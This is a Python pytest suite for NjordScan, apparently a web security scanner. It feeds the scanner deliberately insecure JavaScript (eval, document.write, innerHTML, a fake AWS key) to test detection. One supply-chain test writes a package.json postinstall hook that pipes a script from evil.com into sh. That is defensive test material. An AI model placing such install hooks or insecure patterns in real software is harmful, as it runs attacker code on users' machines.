#!/usr/bin/env python3
"""
Test suite for NjordScan core functionality.

Tests real scanning behavior — verifies that vulnerabilities are actually
detected, not just that objects instantiate.
"""

import pytest
import sys
import os
import tempfile
import json
import asyncio
from unittest.mock import patch, MagicMock

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from njordscan.scanner import Scanner
from njordscan.config import Config
from njordscan.utils import load_config, validate_target
from njordscan.vulnerability import Vulnerability, VulnerabilityIdGenerator


class TestScanner:
    """Test Scanner core functionality with real scan behavior."""

    def setup_method(self):
        self.scanner = Scanner()
        self.temp_dir = tempfile.mkdtemp()

    def teardown_method(self):
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_scanner_initialization(self):
        """Scanner should have an orchestrator with modules loaded."""
        assert self.scanner.orchestrator is not None
        assert len(self.scanner.orchestrator.modules) > 0

    def test_scan_empty_directory_returns_zero_vulns(self):
        """Empty directory should produce no vulnerabilities."""
        result = self.scanner.scan(self.temp_dir)
        assert isinstance(result, dict)
        assert 'vulnerabilities' in result
        assert 'summary' in result
        assert result['summary']['total_issues'] == 0

    def test_scan_result_has_expected_keys(self):
        """Scan result dict should contain all standard keys."""
        result = self.scanner.scan(self.temp_dir)
        expected_keys = {'target', 'framework', 'scan_mode', 'scan_duration',
                         'modules_run', 'vulnerabilities', 'njord_score', 'summary'}
        assert expected_keys.issubset(result.keys())

    def test_scan_detects_document_write_xss(self):
        """Scanner should detect document.write() as an XSS risk."""
        vuln_file = os.path.join(self.temp_dir, 'app.js')
        with open(vuln_file, 'w') as f:
            f.write('document.write(location.hash);\n')

        result = self.scanner.scan(self.temp_dir)
        all_vulns = self._flatten_vulns(result)
        xss_vulns = [v for v in all_vulns if 'xss' in v.get('vuln_type', '').lower()
                     or 'xss' in v.get('title', '').lower()
                     or 'document.write' in v.get('description', '').lower()]
        assert len(xss_vulns) > 0, "Should detect document.write XSS"

    def test_scan_detects_eval_usage(self):
        """Scanner should flag eval() as dangerous."""
        vuln_file = os.path.join(self.temp_dir, 'handler.js')
        with open(vuln_file, 'w') as f:
            f.write('const result = eval(userInput);\n')

        result = self.scanner.scan(self.temp_dir)
        all_vulns = self._flatten_vulns(result)
        eval_vulns = [v for v in all_vulns if 'eval' in v.get('description', '').lower()
                      or 'code_injection' in v.get('vuln_type', '').lower()
                      or 'xss' in v.get('vuln_type', '').lower()]
        assert len(eval_vulns) > 0, "Should detect eval() usage"

    def test_scan_clean_code_has_no_critical(self):
        """Clean, safe code should produce no critical vulnerabilities."""
        safe_file = os.path.join(self.temp_dir, 'safe.js')
        with open(safe_file, 'w') as f:
            f.write('const x = 1 + 2;\nconsole.log(x);\n')

        result = self.scanner.scan(self.temp_dir)
        all_vulns = self._flatten_vulns(result)
        criticals = [v for v in all_vulns if v.get('severity') == 'critical']
        assert len(criticals) == 0, "Safe code should have no critical vulns"

    def test_scan_records_modules_run(self):
        """Result should record which modules actually ran."""
        result = self.scanner.scan(self.temp_dir)
        assert isinstance(result['modules_run'], list)
        assert len(result['modules_run']) > 0

    def test_scan_nonexistent_path_still_returns(self):
        """Scanning a nonexistent path should return a result dict, not crash."""
        result = self.scanner.scan('/nonexistent/path/abc123')
        assert isinstance(result, dict)
        assert 'vulnerabilities' in result

    def _flatten_vulns(self, result):
        """Flatten grouped vulnerabilities into a single list of dicts."""
        vulns = []
        grouped = result.get('vulnerabilities', {})
        if isinstance(grouped, dict):
            for module_vulns in grouped.values():
                if isinstance(module_vulns, list):
                    for v in module_vulns:
                        vulns.append(v if isinstance(v, dict) else v.__dict__ if hasattr(v, '__dict__') else {})
        elif isinstance(grouped, list):
            for v in grouped:
                vulns.append(v if isinstance(v, dict) else v.__dict__ if hasattr(v, '__dict__') else {})
        return vulns


class TestConfig:
    """Test configuration functionality."""

    def test_config_defaults(self):
        """Config should have sensible defaults."""
        config = Config()
        assert config.mode in ('quick', 'standard', 'deep', 'enterprise', 'static', 'dynamic', 'full')
        assert config.framework in ('auto', 'nextjs', 'react', 'vite')
        assert config.report_format in ('terminal', 'json', 'html', 'sarif', 'markdown')

    def test_config_set_get(self):
        """set/get should round-trip values."""
        config = Config()
        config.set('test_key', 'test_value')
        assert config.get('test_key') == 'test_value'

    def test_config_get_returns_default_for_missing(self):
        """get() with a missing key should return the default."""
        config = Config()
        assert config.get('nonexistent_key', 'fallback') == 'fallback'

    def test_config_validate_scan_mode(self):
        """validate_scan_mode should accept valid modes and reject invalid ones."""
        config = Config()
        for mode in ('quick', 'standard', 'deep', 'enterprise'):
            assert config.validate_scan_mode(mode) is True
        assert config.validate_scan_mode('invalid') is False
        assert config.validate_scan_mode('') is False

    def test_config_verbose_default_false(self):
        """Verbose should default to False."""
        config = Config()
        assert config.verbose is False

    def test_config_severity_filter(self):
        """Severity filter should default to info (show everything)."""
        config = Config()
        assert config.min_severity in ('info', 'low', 'medium', 'high', 'critical')


class TestUtils:
    """Test utility functions."""

    def test_load_config_from_json(self):
        """load_config should parse a JSON config file."""
        config_data = {
            'scan_mode': 'standard',
            'output_format': 'json',
            'verbose': True
        }

        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
            json.dump(config_data, f)
            config_file = f.name

        try:
            config = load_config(config_file)
            assert config.get('scan_mode') == 'standard'
            assert config.get('output_format') == 'json'
            assert config.get('verbose') is True
        finally:
            os.unlink(config_file)

    def test_validate_target_valid_dir(self):
        """Valid directory should pass validation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            is_valid, message = validate_target(temp_dir)
            assert is_valid is True

    def test_validate_target_invalid_path(self):
        """Nonexistent path should fail validation."""
        is_valid, message = validate_target('/nonexistent/path')
        assert is_valid is False
        assert isinstance(message, str)
        assert len(message) > 0  # Should give a reason

    def test_validate_target_file(self):
        """Valid file should pass validation."""
        with tempfile.NamedTemporaryFile() as temp_file:
            is_valid, message = validate_target(temp_file.name)
            assert is_valid is True


class TestStaticAnalysisModule:
    """Test CodeStaticModule with real vulnerable code patterns."""

    def setup_method(self):
        from njordscan.modules.code_static import CodeStaticModule
        self.module = CodeStaticModule(Config(), VulnerabilityIdGenerator())

    def test_detects_innerhtml_xss(self):
        """Should detect innerHTML assignment as XSS."""
        with tempfile.TemporaryDirectory() as d:
            f = os.path.join(d, 'app.js')
            with open(f, 'w') as fh:
                fh.write('document.getElementById("out").innerHTML = userInput;\n')
            vulns = asyncio.run(self.module.scan(d))
            assert any('innerHTML' in (v.description or '') or 'xss' in (v.vuln_type or '').lower()
                       for v in vulns), "Should detect innerHTML XSS"

    def test_detects_dangerously_set_inner_html(self):
        """Should detect React dangerouslySetInnerHTML."""
        with tempfile.TemporaryDirectory() as d:
            f = os.path.join(d, 'Component.jsx')
            with open(f, 'w') as fh:
                # Match the regex pattern: dangerouslySetInnerHTML: { __html: ... }
                fh.write('const el = { dangerouslySetInnerHTML: { __html: userContent } };\n')
            vulns = asyncio.run(self.module.scan(d))
            assert any('dangerouslySetInnerHTML' in (v.description or '') for v in vulns), \
                "Should detect dangerouslySetInnerHTML"

    def test_detects_secrets_in_code(self):
        """Should detect hardcoded API keys."""
        with tempfile.TemporaryDirectory() as d:
            f = os.path.join(d, 'config.js')
            with open(f, 'w') as fh:
                fh.write('const API_KEY = "AKIA1234567890ABCDEF";\n')
            vulns = asyncio.run(self.module.scan(d))
            secret_vulns = [v for v in vulns if 'secret' in (v.vuln_type or '').lower()
                           or 'key' in (v.title or '').lower()
                           or 'credential' in (v.description or '').lower()
                           or 'AKIA' in (v.code_snippet or '')]
            assert len(secret_vulns) > 0, "Should detect hardcoded AWS key"

    def test_clean_code_no_vulns(self):
        """Clean code should not produce false positives."""
        with tempfile.TemporaryDirectory() as d:
            f = os.path.join(d, 'safe.js')
            with open(f, 'w') as fh:
                fh.write('const sum = (a, b) => a + b;\nmodule.exports = { sum };\n')
            vulns = asyncio.run(self.module.scan(d))
            assert len(vulns) == 0, f"Clean code should have no vulns, got: {[v.title for v in vulns]}"


class TestSupplyChainModule:
    """Test supply chain module is registered and runs."""

    def test_module_registered(self):
        """Supply chain module should be in MODULE_REGISTRY."""
        from njordscan.modules import MODULE_REGISTRY
        assert 'supply_chain' in MODULE_REGISTRY

    def test_detects_malicious_postinstall(self):
        """Should detect curl|sh in postinstall."""
        from njordscan.modules.supply_chain import SupplyChainModule
        module = SupplyChainModule(Config(), VulnerabilityIdGenerator())
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, 'package.json'), 'w') as f:
                json.dump({
                    "name": "evil",
                    "scripts": {"postinstall": "curl https://evil.com/x.sh | sh"}
                }, f)
            vulns = asyncio.run(module.scan(d))
            assert any(v.severity.value == 'critical' for v in vulns)


class TestIntegration:
    """Integration tests for end-to-end scan flow."""

    def test_full_scan_with_package_json(self):
        """Full scan with package.json should run dependencies module."""
        with tempfile.TemporaryDirectory() as d:
            with open(os.path.join(d, 'package.json'), 'w') as f:
                json.dump({
                    "name": "test-app",
                    "version": "1.0.0",
                    "dependencies": {"express": "^4.18.0"}
                }, f)
            scanner = Scanner()
            result = scanner.scan(d)
            assert 'vulnerabilities' in result
            assert result['scan_duration'] > 0

    def test_scan_duration_is_positive(self):
        """Scan duration should be a positive number."""
        with tempfile.TemporaryDirectory() as d:
            scanner = Scanner()
            result = scanner.scan(d)
            assert result['scan_duration'] > 0

    def test_njord_score_in_range(self):
        """NjordScore should be between 0 and 100."""
        with tempfile.TemporaryDirectory() as d:
            scanner = Scanner()
            result = scanner.scan(d)
            score = result.get('njord_score', {})
            if isinstance(score, dict):
                total = score.get('total_score', score.get('score', 0))
            else:
                total = score
            assert 0 <= total <= 100


if __name__ == '__main__':
    pytest.main([__file__])
